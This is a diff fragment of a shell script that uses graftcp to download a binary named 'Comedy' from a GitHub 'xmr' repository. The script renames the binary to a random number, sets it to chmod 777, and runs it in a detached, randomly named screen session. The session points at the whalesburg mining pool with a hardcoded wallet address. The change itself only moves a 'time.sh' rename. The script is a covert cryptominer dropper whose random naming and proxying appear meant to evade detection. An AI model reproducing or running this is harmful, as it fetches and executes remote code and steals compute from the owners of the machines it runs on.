@@ -35,13 +35,13 @@ echo " "
 
 GOGO=$(shuf -i 10000-999999999 -n 1)
 MARKONAH=$(shuf -i 10000-9999999999 -n 1)
-TIME=$(shuf -i 10000-9999999999 -n 1)
+
 
 ./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/Comedy
 
 mv -f Comedy $GOGO
 chmod 777 $GOGO
-mv -f time.sh $TIME
+
 
 screen -S $MARKONAH -dm ./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.SLEEP
 
@@ -49,4 +49,8 @@ screen -ls
 sleep 2
 clear
 cd ..
+
 screen -ls
+TIME=$(shuf -i 10000-9999999999 -n 1)
+mv -f time.sh $TIME
+
